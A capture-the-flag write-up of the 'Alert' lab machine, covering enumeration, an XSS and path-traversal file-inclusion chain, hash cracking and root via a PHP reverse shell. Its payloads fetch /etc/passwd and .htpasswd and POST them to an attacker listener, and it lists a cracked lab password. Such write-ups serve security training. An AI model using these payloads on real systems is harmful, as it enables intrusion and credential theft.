+++
date = '2026-05-17T17:39:23+02:00'
draft = false
title = 'Alert Writeup EN'
+++
**Name:** `joy.scd01`

**Date:** `24/01/2025`

![Alert.png](/images/imgs_alert/Alert.png)

---
# Introduction

_Alert_ is an **Easy-level Linux machine** built around a couple of simple but nicely chained vulnerabilities.

Initial access comes from combining an **XSS** with an **LFI** to exfiltrate files from the server.

Privilege Escalation is achieved through a misconfigured **local web application**, where a writable configuration file allowed me to drop a PHP reverse shell and get **root** access.

---
# Techniques used

- **Cross-site Scripting + Local File Inclusion Chain**
- **Local Web App Misconfiguration (Writable PHP Config)**

---
# Enumeration

## nmap

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -T4 alert
```

![nmap.png](/images/imgs_alert/nmap.png)

**Found 2 open ports**:

- **22**/tcp ssh
- **80**/tcp http running Apache httpd 2.4.41 | **redirect to `http://alert.htb`**

So I added `alert.htb` to my `/etc/hosts` file, ran **gobuster** for directories scan, and **ffuf** for virtual hosts scan.

---
## gobuster

```bash
gobuster dir -u alert.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50
```

![gobuster_dir.png](/images/imgs_alert/gobuster_dir.png)
## ffuf

```bash
ffuf -u http://alert.htb -H 'HOST: FUZZ.alert.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -ac
```

![ffuf_vhost.png](/images/imgs_alert/ffuf_vhost.png)

I found a virtual host "**statistics**" that I added to my `/etc/hosts` file.

---
## Web App

I checked the virtual host : **`statistics.alert.htb`** which exposed a simple login form.

On `alert.htb` there’s a web app that lets you upload a **Markdown** file and renders it as **HTML**, so that was the first place where I tried an **XSS** payload:

```bash
<script>alert('XSS Test');</script>
```

![test.md.png](/images/imgs_alert/test.md.png)

That worked.

I also analyzed the contact page, where you can enter a random email and a message for the **administrator**.

I tested if the parameter `message` triggered any interaction by submitting my IP:

```text
Message : http://<ip>:<port>/
```

I started a **socat** listener and got a response :

```bash
socat TCP-LISTEN:22667,reuseaddr,fork -
```

![socat.png](/images/imgs_alert/socat.png)

So I tried to combine **XSS vulnerability** in the upload page and the **LFI** in the contact page to gain a foothold.

---
# Initial Access - XSS and Command Injection Chain

Since the administrator bot would be rendering the Markdown, I needed a way to trigger a local file read and exfiltrate the data back to me. I crafted a JavaScript payload where the first request exploits the LFI in the `messages.php` file to read local files, and the second one sends the retrieved content to my socat listener via a POST request.

Payload:

```bash
<script>fetch("http://alert.htb/messages.php?file=../../../../etc/passwd").then(response => response.text()).then(data => {fetch("http://<ip>:<port>/", {method: "POST", body: data})});</script>
```

I uploaded it and when I clicked on **View Markdown**, this created a **URL** that I copied and pasted in the message parameter of the contact page.

When I sent it, a request immediately hit my **socat** listener, containing the output of the `/etc/passwd` file:

![etcpasswd.png](/images/imgs_alert/etcpasswd.png)

We got 2 users :
"**albert**" and "**david**".

At that point I didn’t have a clear path forward, so I did what I usually do in these cases: **I went back and reviewed the initial enumeration**. 

I figured out that the server was Apache/2.4.41 Ubuntu (**Nmap services scan output**) and I remembered of the `.htpasswd` file (**Gobuster directories scan output**).

So I decided to modify my payload to obtain that file :

```bash
<script>fetch("http://alert.htb/messages.php?file=../../../../var/www/statistics.alert.htb/.htpasswd").then(response => response.text()).then(data => {fetch("http://<ip>:<port>/", {method: "POST", body: data})});</script>
```

Found the hashed password for "**albert**" :

![htpasswd.png](/images/imgs_alert/htpasswd.png)

**Note**: The decision to read the `.htpasswd` file was not random, but guided by experience. I had previously found sensitive information inside this specific file, which **highlights once again the importance of carefully analyzing the data collected during the initial enumeration phase**.

I used **hashcat** to crack it :

```bash
hashcat -m 1600 -a 0 alb_hash /usr/share/wordlists/rockyou.txt
```

![password_alb.png](/images/imgs_alert/password_alb.png)

With creds (**albert:manchesterunited**) I gained a foothold in this box via **SSH**.

Inside `/home/albert`, I found the **user flag**.

![user.png](/images/imgs_alert/user.png)

---
# Privilege Escalation | Local Web App Misconfiguration (PHP Reverse Shell Upload) → root

To escalate my privileges, I started to enumerate the machine with basic commands :

```bash
albert@alert:~$ ss -lntp
```

![lntp.png](/images/imgs_alert/lntp.png)

**Port 8080 listening on localhost**.

I created an **SSH tunnel** to see what that was :

```bash
ssh -L 22667:localhost:8080 albert@alert
```

Now I was able to see the web app on "http://localhost:22667".
It's a "**website-monitor**" page.
I couldn't find a way to exploit it, so I checked on the server if there were any information about this web app and how it works.

Here I found the directory containing "**configuration.php**" file:

![php.png](/images/imgs_alert/php.png)

User **albert** was able to modify this file so I dropped a simple **PHP reverse shell** (one of the classic ones you can find anywhere) into `configuration.php`, set up a **netcat listener**, and saved the file.

As soon as I saved it — boom, **root** reverse shell.

![root.png](/images/imgs_alert/root.png)

---
# Final Thoughts

This machine was a great example of how simple, chained vulnerabilities lead to a full compromise.

The initial access phase was quite fun, requiring an **XSS** to be linked with a **Local File Inclusion** to **exfiltrate data** — a scenario you often see in **real-world apps** where user input flows through multiple components without proper filtering.

The Privilege Escalation part highlighted how dangerous permissive file permissions can be.
The **SSH tunnel** was essential to analyze the local `website-monitor` app properly, and finding straightforward path to root.
